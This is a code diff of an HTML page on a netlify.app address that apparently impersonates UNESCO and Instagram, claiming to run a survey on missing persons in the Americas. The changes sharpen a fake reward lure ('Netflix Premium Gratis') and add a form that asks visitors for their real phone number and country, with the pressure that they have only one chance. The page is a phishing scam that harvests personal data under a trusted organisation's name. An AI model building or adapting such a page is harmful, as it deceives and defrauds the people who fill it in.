@@ -3,22 +3,22 @@
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-        <title>UNESCO: Encuesta 2025. Construir la paz mediante la educación, la ciencia y la cultura, la comunicación y la información</title>
+        <title>UNESCO: Tu opinión importa y tiene recompensa, participa ya</title>
         <meta name="description" content="Conozca más sobre la función, la visión y los resultados de la UNESCO. La UNESCO es la Organización de las Naciones Unidas para la Educación, la Ciencia y la Cultura. Nuestro objetivo es promover la paz y la seguridad mediante la cooperación internacional.">
         <meta property="og:url" content="https://unesco-encuesta-participa.netlify.app">
         <meta property="og:type" content="website">
-        <meta property="og:title" content="UNESCO: Encuesta 2025. Construir la paz mediante la educación, la ciencia y la cultura, la comunicación y la información">
+        <meta property="og:title" content="UNESCO: Tu opinión importa y tiene recompensa, participa ya">
         <meta property="og:description" content="Conozca más sobre la función, la visión y los resultados de la UNESCO. La UNESCO es la Organización de las Naciones Unidas para la Educación, la Ciencia y la Cultura. Nuestro objetivo es promover la paz y la seguridad mediante la cooperación internacional.">
-        <meta property="og:image" content="https://unesco-encuesta-participa.netlify.app/images/og.jpg?v=202518">
+        <meta property="og:image" content="https://unesco-encuesta-participa.netlify.app/images/og2.jpg?v=202539">
         <!--meta property="og:image:width" content="1200">
         <meta property="og:image:height" content="628">-->
         
         <meta name="twitter:card" content="summary_large_image">
         <meta property="twitter:domain" content="unesco-encuesta-participa.netlify.app">
         <meta property="twitter:url" content="https://unesco-encuesta-participa.netlify.app">
-        <meta name="twitter:title" content="UNESCO: Encuesta 2025. Construir la paz mediante la educación, la ciencia y la cultura, la comunicación y la información">
+        <meta name="twitter:title" content="UNESCO: Tu opinión importa y tiene recompensa, participa ya">
         <meta name="twitter:description" content="Conozca más sobre la función, la visión y los resultados de la UNESCO. La UNESCO es la Organización de las Naciones Unidas para la Educación, la Ciencia y la Cultura. Nuestro objetivo es promover la paz y la seguridad mediante la cooperación internacional.">
-        <meta name="twitter:image" content="https://unesco-encuesta-participa.netlify.app/images/og.jpg?v=202528">
+        <meta name="twitter:image" content="https://unesco-encuesta-participa.netlify.app/images/og2.jpg?v=202539">
 
         <link rel="stylesheet" href="style.css" type="text/css" />
         
@@ -58,8 +58,13 @@
             <header>
                 <img src="images/unesco.svg" alt="" id="logo">
                 <h2>Personas Desaparecidas en América: Una Iniciativa de UNESCO e Instagram</h2>
-                <p><a href="https://www.unesco.org" style="font-weight:700; text-decoration: ; color: inherit; cursor: pointer;">UNESCO</a>, junto con Instagram, invita a participar en una serie de encuestas rápidas de selección de preferencia sobre el aumento de personas desaparecidas en América y en el mundo y el uso de redes sociales en su búsqueda. Tu participación es anónima y fundamental para ayudar a diseñar mejores soluciones.</p>
-                <p style="font-weight: 700;">🎁 Al completar la encuesta, recibirás una recompensa especial <span style="font-style: italic; font-weight: 400; opacity: 0.5;">(Netflix).</span></p>
+
+                <p><a href="#" style="font-weight: 700; color: inherit; cursor: pointer;">UNESCO,</a> junto con Instagram invita a participar en encuestas rápidas sobre el aumento de personas desaparecidas en América y el mundo, y el uso de redes sociales en su búsqueda. Tu participación es anónima y clave para ayudar a crear mejores soluciones.</p>
+                <div style="display: flex; flex-direction: column; align-items: center; text-align: center; gap: 5px; background-color: red; border-radius: 0 25px 0 25px; padding: 8px 10px; width: 100%; max-width: 100%; margin-top: 3px;">
+                    <p style="color: rgba(255, 255, 255, 0.8); font-size: 14.8px; margin: 0; font-weight: 500;">Recompensa</p>
+                    <h5 style="color: white; font-size: 23.5px; margin: 0;">Netflix Premium Gratis</h5>
+                </div>
+                
                 <p id="fecha"></p>
             </header>
             <section class="survey-section">
@@ -68,6 +73,18 @@
                     <label><input type="radio" name="answer" value="si"> Sí</label>
                     <label><input type="radio" name="answer" value="no"> No</label>-->
                 </div>
+
+                <div id="div-none" class="none-flex" style="display: none; flex-direction: column; gap: 5px; padding: 16px 24px; background-color: var(--color-blanco); max-width: 100%;">
+                    <p style="font-size: 17.3px; font-weight: 600; color: var(--color-azul);">¡Gracias por completar la encuesta!</p>
+                    <p style="font-weight: 500; font-size: 16px; margin: 6px 0;">Para recibir tu código de <strong>Netflix Premium Gratis</strong>, ingresa cuidadosamente tu país y número de celular reales para recibirlo.<br><strong>Solo tendrás una oportunidad,</strong> así que asegúrate de poner tus datos correctamente antes de pulsar el botón de abajo.</p>
+                    <label for="celular" style="font-weight: 400; font-size: 14.5px; font-family: 'Inter', sans-serif;">Número de celular:</label>
+                    <input class="input-p-n" type="tel" id="celular" maxlength="17" name="celular" inputmode="numeric" placeholder="Escribe tu número" required style="margin-bottom: 10px;" />
+                    <label for="pais" style="font-weight: 400; font-size: 14.5px; font-family: 'Inter', sans-serif;">País:</label>
+                    <input class="input-p-n" type="text" id="pais" maxlength="50" name="pais" placeholder="Escribe tu país" required />
+                </div>
+
+
+                
                 <button class="boton" onclick="nextQuestion()">Siguiente</button>
             </section>
             <footer>
